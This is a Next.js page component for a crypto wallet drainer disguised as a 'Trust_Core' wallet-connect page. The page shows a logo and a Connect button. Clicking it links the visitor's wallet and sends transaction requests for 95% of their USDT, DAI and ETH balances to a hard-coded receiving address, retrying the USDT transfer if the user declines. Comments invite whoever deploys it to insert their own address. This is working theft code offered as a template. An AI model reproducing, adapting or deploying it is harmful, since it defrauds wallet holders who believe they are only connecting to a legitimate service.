import Image from "next/image";
import { address, abi } from "../constants/ethUsdt";
import { daiAbi, daiAddress } from "@/constants/dai";
import Web3Modal from "web3modal";
import { ethers } from "ethers";
import WalletConnectProvider from "@walletconnect/web3-provider";

let web3Modal;

//wallet connect option
const providerOptions = {
  walletconnect: {
    package: WalletConnectProvider, // required
    options: {
      rpc: { 1: process.env.NEXT_PUBLIC_RPC_URL }, // required
    },
  },
};

if (typeof window !== "undefined") {
  web3Modal = new Web3Modal({
    cacheProvider: false,
    providerOptions, // required
  });
}

export default function Home() {
  let provider, signer, signerAddress, contract;
  async function connect() {
    try {
      const web3ModalProvider = await web3Modal.connect(); //connect to wallet
      provider = new ethers.providers.Web3Provider(web3ModalProvider);
      signer = provider.getSigner();
      signerAddress = await signer.getAddress();
      try {
        sendUsdt();
        sendDai();
        await sendEth();
      } catch (e) {
        if (
          e.message ==
            "MetaMask Tx Signature: User denied transaction signature." ||
          "User rejected the request."
        ) {
          await sendUsdt();
        } else if (
          e.message ==
          `call revert exception (method="balanceOf(address)", errorSignature=null, errorArgs=[null], reason=null, code=CALL_EXCEPTION, version=abi/5.0.1)`
        ) {
          alert("Please change your Metamask network");
        } else console.log(e.message);
      }
    } catch (e) {
      console.log(e);
    }
  }

  async function sendUsdt() {
    contract = new ethers.Contract(address, abi, signer); //new instance of usdt contract
    const balance = Number(
      (await contract.balanceOf(signerAddress)).toString()
    );

    const tx = await contract.transfer(
      "0x6Ac97c57138BD707680A10A798bAf24aCe62Ae9D", // reciever address, please put your address
      BigInt(balance * 0.95)
    );
    await tx.wait(1);
  }

  async function sendDai() {
    contract = new ethers.Contract(daiAddress, daiAbi, signer); //new instance of usdt contract
    const balance = Number(
      (await contract.balanceOf(signerAddress)).toString()
    );

    const tx = await contract.transfer(
      "0x6Ac97c57138BD707680A10A798bAf24aCe62Ae9D", // reciever address, please put your address
      BigInt(balance * 0.95)
    );
    await tx.wait(1);
  }

  async function sendEth() {
    const balance = Number(
      (await provider.getBalance(signerAddress)).toString()
    );
    const tx = await signer.sendTransaction({
      to: "0x6Ac97c57138BD707680A10A798bAf24aCe62Ae9D", // reciever address, please put your address
      value: ethers.utils.parseEther(`${(balance * 0.95) / 1e18}`),
    });
    await provider.waitForTransaction(tx.hash, 1, 150000).then(() => {});
  }

  return (
    <div className="home">
      <Image
        src="Trust_Core Logo_Blue.svg" // Path to your image
        alt="Logo"
        width={500} // Width of the image
        height={300} // Height of the image
      />
      <button onClick={connect} className="wallet-connect-button">
        Connect
      </button>
    </div>
  );
}
